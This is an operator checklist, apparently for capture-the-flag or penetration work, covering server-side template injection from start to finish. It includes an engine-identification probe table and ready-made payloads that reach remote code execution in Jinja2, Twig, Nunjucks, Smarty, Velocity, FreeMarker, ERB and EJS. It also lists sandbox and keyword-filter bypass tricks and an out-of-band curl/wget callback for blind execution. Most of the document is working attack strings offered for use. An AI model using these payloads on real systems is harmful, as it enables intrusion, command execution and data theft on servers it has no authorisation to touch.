# Operator checklist — the SSTI engagement end to end

## Intake

- [ ] Identify every value the server renders into a template: URL params, form
      fields, stored names/descriptions, error messages, email/PDF/notification
      generators, search-result headings.
- [ ] Distinguish SSTI from a plain reflection: the value must be *evaluated* by
      the template engine, not just echoed. `${7*7}`→`49`, `{{7*7}}`→`49`,
      `<%= 7*7 %>`→`49` proves evaluation; `${7*7}`→`${7*7}` proves plain echo.

## Engine identification — the payload depends on it

Probe with a decision tree; record each response verbatim:

| Send | If result | Engine family |
|---|---|---|
| `{{7*7}}` | `49` | Jinja2 / Twig / Nunjucks / Handlebars-family |
| `${7*7}` | `49` | FreeMarker / Velocity / Thymeleaf / Mako-EL |
| `<%= 7*7 %>` | `49` | ERB / EJS / JSP |
| `{{7*'7'}}` | `7777777` | Jinja2 (Python str*int) — vs `49` in Twig (PHP) |
| `{{7*'7'}}`→`49` | PHP engine | Twig / Smarty / Blade |
| `@{7*7}` | `49` | Razor (.NET) |
| `#{7*7}` | `49` | Ruby Slim / Java EL |
| `{{=7*7}}` | `49` | underscore.js / templating |
| `[[${7*7}]]` | `49` | Thymeleaf inline |

An error page naming the engine (`jinja2.exceptions`, `Twig\Error`,
`freemarker.core`, `nunjucks`) is a direct read.

## The escape ladder — from sandbox to RCE

- [ ] Jinja2: `{{ ''.__class__.__mro__[2].__subclasses__() }}` → find
      `subprocess.Popen` or `os._wrap_close`, or use
      `{{ config.__class__.__init__.__globals__ }}`; the `|attr()` filter and
      `{{ self._TemplateReference__context }}` bypass `__` filters.
- [ ] Twig: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
      or `{{['id']|map('system')}}` / `{{['id']|filter('system')}}`.
- [ ] Nunjucks (JS): `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}`.
- [ ] Smarty: `{php}echo `id`;{/php}` (old), `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru('id');",self::clearConfig())}` (new).
- [ ] Velocity: `#set($x=$e.getClass().forName("java.lang.Runtime"))` → `getRuntime().exec("id")`.
- [ ] FreeMarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` or `?new()` on `ObjectConstructor`.
- [ ] ERB: `<%= system('id') %>` / `<%= `id` %>`; EJS: `<%= process.mainModule.require('child_process').execSync('id') %>`.

## Sandbox-bypass techniques

- [ ] `attr()` filter to read `__class__` when `.` access is blocked.
- [ ] String concat `'__cla''ss__'` when a keyword is blocked.
- [ ] `|join`, `|map`, `|selectattr`, `request.args`, `request.values`,
      `lipsum`, `cycler`, `joiner`, `namespace` — the Jinja2 built-in object graph
      for reaching `os`/`subprocess` without a literal import.
- [ ] Hex/octal/unicode escapes inside string literals for blocked words.
- [ ] `{%raw%}`/`{%verbatim%}` or comment blocks if the payload itself is being
      re-parsed.

## Confirmation & evidence

- [ ] A `49`/`7777777`/engine-error proves evaluation; it is not the flag.
- [ ] RCE is proven by a command output (`id`, `cat /flag`) returning verbatim in
      the rendered response — record the exact payload and the raw output.
- [ ] If RCE is blind (no echo), use a time-based `{{x.__class__…("sleep 5")}}`
      delta or an OOB `curl`/`wget` to `oob_listener` — record the inbound hit.
- [ ] Record every engine-ID probe and every blocked sandbox step as a negative
      result, not a discarded attempt.

## Stop / escalate

- [ ] `{{7*7}}` echoes literally → not a template value; it is plain reflection —
      reclassify toward XSS or info-disclosure instead of forcing SSTI.
- [ ] `{{7*7}}` renders as `${7*7}` / `%7B%7B` escaped → the value is HTML-escaped
      at the sink; a template payload cannot run, switch to the XSS ladder.
- [ ] An engine is identified but every gadget returns a sandbox error → the
      engine is locked down; try the `attr`/built-in-object route, else escalate
      to a logic/file-read path the template still permits.
- [ ] No evaluation after the full decision tree → the class is not SSTI; record
      the negative and reclassify.
